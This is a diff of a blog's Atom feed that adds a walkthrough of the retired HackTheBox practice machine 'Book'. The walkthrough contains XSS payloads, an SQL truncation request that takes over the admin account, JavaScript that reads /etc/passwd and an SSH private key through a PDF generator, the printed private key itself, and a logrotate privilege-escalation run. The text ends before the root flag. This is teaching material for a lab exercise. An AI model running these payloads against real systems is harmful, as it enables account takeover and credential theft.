@@ -1,5 +1,265 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-07-07T09:09:00+02:00</updated><entry><title>HTB: Forwardslash</title><link href="https://maggick.fr/2020/07/htb-forwardslash.html" rel="alternate"></link><published>2020-07-07T09:09:00+02:00</published><updated>2020-07-07T09:09:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-07:/2020/07/htb-forwardslash.html</id><summary type="html">&lt;p&gt;&lt;img alt="Forwardslash card" class="align-left" src="/media/2020.07/forwardslash_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-07-12T16:30:00+02:00</updated><entry><title>HTB: Book</title><link href="https://maggick.fr/2020/07/htb-book.html" rel="alternate"></link><published>2020-07-12T16:30:00+02:00</published><updated>2020-07-12T16:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-12:/2020/07/htb-book.html</id><summary type="html">&lt;p&gt;&lt;img alt="Book card" class="align-left" src="/media/2020.07/book_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/230"&gt;Book&lt;/a&gt;
+This box is classified as a medium machine published on February the 22th 2020
+by &lt;a href="https://www.hackthebox.eu/home/users/profile/13531"&gt;MrR3boot&lt;/a&gt;.
+It involves some XSS, an SQL truncation injection and a CVE on logrotate.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.07/book_card.png" alt="Book card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/230"&gt;Book&lt;/a&gt;
+This box is classified as a medium machine published on February the 22th 2020
+by &lt;a href="https://www.hackthebox.eu/home/users/profile/13531"&gt;MrR3boot&lt;/a&gt;.
+It involves some XSS, an SQL truncation injection and a CVE on logrotate.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Feb 25 07:26:24 2020 as: nmap --top-ports=10000 -sS -oN nmap 10.10.10.176&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.176&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 8318 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Tue Feb 25 07:31:10 2020 -- 1 IP address (1 host up) scanned in 286.11 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The landing web page is a simple sign up/ login form.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="authentication and signup forms" src="/media/2020.07/book_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;We can create an account on the box (there is no email verification).&lt;/p&gt;
+&lt;p&gt;Once logged in we can browse the book collections, download them and learn
+things about the flowers.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="User panel" src="/media/2020.07/book_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;We can also upload books by uploading a PDF file and providing the author name
+and the book title. This two fields are vulnerable to XSS injection even using a
+simple payload as &lt;code&gt;&amp;lt;img src="" onerror=alert(1)/&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;To trigger the XSS we need to search for our book.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="admin panel" src="/media/2020.07/book_04.png"&gt;
+&lt;img alt="admin panel" src="/media/2020.07/book_05.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Note: This need to be exploited quickly as the book collection is periodicaly
+reset.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;The Contact form give us the email address of the platform's administrator:
+&lt;code&gt;admin@book.htb&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id="admin-panel"&gt;admin panel&lt;/h2&gt;
+&lt;p&gt;When looking at the website pages we found &lt;code&gt;/admin/&lt;/code&gt; another login form.&lt;/p&gt;
+&lt;p&gt;Using &lt;a href="https://resources.infosecinstitute.com/sql-truncation-attack"&gt;SQL truncation&lt;/a&gt;
+we can change the admin account password on the plateform:&lt;/p&gt;
+&lt;p&gt;We register a new user with a specific long email using Burp repeater.
+Our post data request is the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/index.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;10.10.10.176&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;en-US,en;q=0.5&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://10.10.10.176/index.php&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;222&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;PHPSESSID=9li0llrrcn7tthael9i5s8pmsr&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="na"&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;1&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;name=ppqqe&amp;amp;email=admin%40book.htb%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*&amp;amp;password=q&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can now logged in as &lt;code&gt;admin@book.htb&lt;/code&gt; using the password &lt;code&gt;q&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="admin panel" src="/media/2020.07/book_03.png"&gt;&lt;/p&gt;
+&lt;p&gt;The admin panel allow to download the users' and books' collections.
+As we saw previously the files &lt;code&gt;book title&lt;/code&gt; and &lt;code&gt;book author&lt;/code&gt; are vulnerable to
+an XSS.&lt;/p&gt;
+&lt;p&gt;It is possible to &lt;a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html"&gt;transform an XSS in a generated PDF into an LFI&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We create a new book with our user account and put a specific JavaScript payload
+in the &lt;code&gt;book title&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(&amp;quot;GET&amp;quot;,&amp;quot;file:///etc/passwd&amp;quot;); x.send(); &lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then we generate the collection PDF. It will include the whole &lt;code&gt;/etc/passwd&lt;/code&gt;
+file. We see that the only system user is &lt;code&gt;reader&lt;/code&gt; (UID 1000).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;
+&lt;span class="code-line"&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;gnats:x:41:41:GnatsBug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;systemd-network:x:100:102:systemd NetworkManagement,,,:/run/systemd/netif:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;systemd-resolve:x:101:103:systemdResolver,,,:/run/systemd/resolve:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;syslog:x:102:106::/home/syslog:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;messagebus:x:103:107::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;_apt:x:104:65534::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;lxd:x:105:65534::/var/lib/lxd/:/bin/false&lt;/span&gt;
+&lt;span class="code-line"&gt;uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;pollinate:x:109:1::/var/cache/pollinate:/bin/false&lt;/span&gt;
+&lt;span class="code-line"&gt;sshd:x:110:65534::/run/sshd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;reader:x:1000:1000:reader:/home/reader:/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We need to get a shell on the box and if possible a persistent access (like a
+checkpoint) as a password or ssh private key. That's why we just try to get
+&lt;code&gt;/home/reader/.ssh/id_rsa&lt;/code&gt; with the following payload:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(&amp;quot;GET&amp;quot;,&amp;quot;file:///home/reader/.ssh/id_rsa&amp;quot;); x.send(); &lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then we download the PDF file. It contains a SSH private key.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJG8m6UNZyRGj&lt;/span&gt;
+&lt;span class="code-line"&gt;7eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0WxtCK0VlQUwxZ6953D16uxl&lt;/span&gt;
+&lt;span class="code-line"&gt;RH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd&lt;/span&gt;
+&lt;span class="code-line"&gt;/j3xWXHgpaJciHKxeNlr8x6NgbPv4s7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hL&lt;/span&gt;
+&lt;span class="code-line"&gt;W1UGx/13fh20cZXA6PK75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7&lt;/span&gt;
+&lt;span class="code-line"&gt;hihAbIi73mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+McK&lt;/span&gt;
+&lt;span class="code-line"&gt;IrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUItIGcAaz3dTODgD&lt;/span&gt;
+&lt;span class="code-line"&gt;O04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJjhPHFI7usIxmgX8Q2/nx3LSUN&lt;/span&gt;
+&lt;span class="code-line"&gt;eZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lc&lt;/span&gt;
+&lt;span class="code-line"&gt;PzvVGOEGQzkuu4ljFkYz6sZ8GMx6GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmT&lt;/span&gt;
+&lt;span class="code-line"&gt;mk3A7jOwke0o8/4FLE2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPl&lt;/span&gt;
+&lt;span class="code-line"&gt;SNbc8/ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+SRM/A&lt;/span&gt;
+&lt;span class="code-line"&gt;bh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7lskGl3dh4M/2Tgl/g&lt;/span&gt;
+&lt;span class="code-line"&gt;YPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+Vo5GVjWTOlfEj74k8hC6GjzWHna0&lt;/span&gt;
+&lt;span class="code-line"&gt;pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7mHc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl&lt;/span&gt;
+&lt;span class="code-line"&gt;/FOW2AFbkzoNbHT9GpTj5ZfacChBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k&lt;/span&gt;
+&lt;span class="code-line"&gt;8J+fVHJl4IjT80uPb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOA&lt;/span&gt;
+&lt;span class="code-line"&gt;MYkhsMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCftdBBP0U&lt;/span&gt;
+&lt;span class="code-line"&gt;v2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi5bBLnzECgYEAlLiYGz&lt;/span&gt;
+&lt;span class="code-line"&gt;P92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlWy1K/LbqIV3C01ruxVBOV7ivUYrRkx&lt;/span&gt;
+&lt;span class="code-line"&gt;R/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TNnkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABI&lt;/span&gt;
+&lt;span class="code-line"&gt;prhDfKUSbHzLIR4=&lt;/span&gt;
+&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can then connect as &lt;code&gt;reader&lt;/code&gt; using ssh and grab the user's flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# ssh reader@10.10.10.176&lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;* Documentation:  https://help.ubuntu.com&lt;/span&gt;
+&lt;span class="code-line"&gt;* Management:     https://landscape.canonical.com&lt;/span&gt;
+&lt;span class="code-line"&gt;* Support:        https://ubuntu.com/advantage&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  System information as of Thu Feb 27 15:39:22 UTC 2020&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  System load:  0.22               Processes:            153&lt;/span&gt;
+&lt;span class="code-line"&gt;  Usage of /:   26.5% of 19.56GB   Users logged in:      1&lt;/span&gt;
+&lt;span class="code-line"&gt;  Memory usage: 22%                IP address for ens33: 10.10.10.176&lt;/span&gt;
+&lt;span class="code-line"&gt;  Swap usage:   0%&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;* Canonical Livepatch is available for installation.&lt;/span&gt;
+&lt;span class="code-line"&gt;  - Reduce system reboots and improve kernel security. Activate at:&lt;/span&gt;
+&lt;span class="code-line"&gt;    https://ubuntu.com/livepatch&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;114 packages can be updated.&lt;/span&gt;
+&lt;span class="code-line"&gt;0 updates are security updates.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Thu Feb 27 15:36:29 2020 from 10.10.16.155&lt;/span&gt;
+&lt;span class="code-line"&gt;reader@book:~$ cat user.txt &lt;/span&gt;
+&lt;span class="code-line"&gt;51c1d4b5197fa30e3e5d37f8778f95bc&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
+&lt;h2 id="enumeration"&gt;enumeration&lt;/h2&gt;
+&lt;p&gt;When looking at our user's home folder we found a &lt;code&gt;backups&lt;/code&gt; folder containing
+two files: &lt;code&gt;access.log&lt;/code&gt; and &lt;code&gt;access.log.1&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We continue to enumerate the box and mainly the process using &lt;a href="https://github.com/DominicBreuker/pspy"&gt;pspy&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reader@book:~$ ./pspy64&lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:13 CMD: UID=0    PID=19874  | /usr/sbin/logrotate -f /root/log.cfg &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:13 CMD: UID=0    PID=19873  | /bin/sh /root/log.sh &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:13 CMD: UID=0    PID=19875  | sleep 5 &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:18 CMD: UID=1000 PID=19876  | /usr/sbin/apache2 -k start &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:18 CMD: UID=0    PID=19878  | /usr/sbin/logrotate -f /root/log.cfg &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:18 CMD: UID=0    PID=19877  | /bin/sh /root/log.sh &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:18 CMD: UID=0    PID=19879  | sleep 5 &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:19 CMD: UID=1000 PID=19880  | /usr/sbin/apache2 -k start &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19885  | /lib/systemd/systemd-udevd &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19884  | /lib/systemd/systemd-udevd &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19883  | /lib/systemd/systemd-udevd &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19882  | /bin/sh /root/log.sh &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19881  | /bin/sh /root/log.sh &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19891  | /lib/systemd/systemd-udevd &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:20 CMD: UID=0    PID=19890  | /lib/systemd/systemd-udevd &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:21 CMD: UID=0    PID=19889  | /lib/systemd/systemd-udevd &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:21 CMD: UID=0    PID=19888  | /lib/systemd/systemd-udevd &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:21 CMD: UID=0    PID=19887  | /lib/systemd/systemd-udevd &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:21 CMD: UID=0    PID=19886  | /lib/systemd/systemd-udevd &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:21 CMD: UID=0    PID=19892  | &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:23 CMD: UID=0    PID=19894  | /usr/sbin/logrotate -f /root/log.cfg &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:23 CMD: UID=0    PID=19893  | /bin/sh /root/log.sh &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:23 CMD: UID=0    PID=19895  | sleep 5 &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:28 CMD: UID=0    PID=19898  | /usr/sbin/logrotate -f /root/log.cfg &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:28 CMD: UID=0    PID=19897  | /bin/sh /root/log.sh &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:28 CMD: UID=0    PID=19899  | sleep 5 &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:29 CMD: UID=1000 PID=19900  | /usr/sbin/apache2 -k start &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/02/27 13:51:30 CMD: UID=1000 PID=19901  | /usr/sbin/apache2 -k start&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We see that the root user (&lt;code&gt;UID=0&lt;/code&gt;) is periodically executing the following
+commands:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/usr/sbin/logrotate -f /root/log.cfg&lt;/span&gt;
+&lt;span class="code-line"&gt;/bin/sh /root/log.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;sleep 5&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="logrotate"&gt;logrotate&lt;/h2&gt;
+&lt;p&gt;We look at the logrotate version.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reader@book:~$ logrotate --version&lt;/span&gt;
+&lt;span class="code-line"&gt;logrotate 3.11.0&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This version is &lt;a href="https://packetstormsecurity.com/files/154743/Logrotate-3.15.1-Privilege-Escalation.html"&gt;vulnerable to a privilege escalation&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We copy the C exploit using SSH, compile it, create a specific payload file and run the exploit on
+the access.log file (in debug mode).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gcc -o logrotten logrotten.c&lt;/span&gt;
+&lt;span class="code-line"&gt;$ cat payloadfile&lt;/span&gt;
+&lt;span class="code-line"&gt;cp /root/root.txt /tmp/systemd-timesyncd/ ; chmod 777 /tmp/systemd-timesyncd/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;$ ./logrotten -p ./payloadfile /home/reader/backups/access.log -d&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In another terminal we put data inside the access.log file.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reader@book:~$ python -c &amp;#39;print &amp;quot;a&amp;quot;*10000&amp;#39;&amp;gt; backups/access.log&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then we wait a bit for the file to be created and we can display our &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
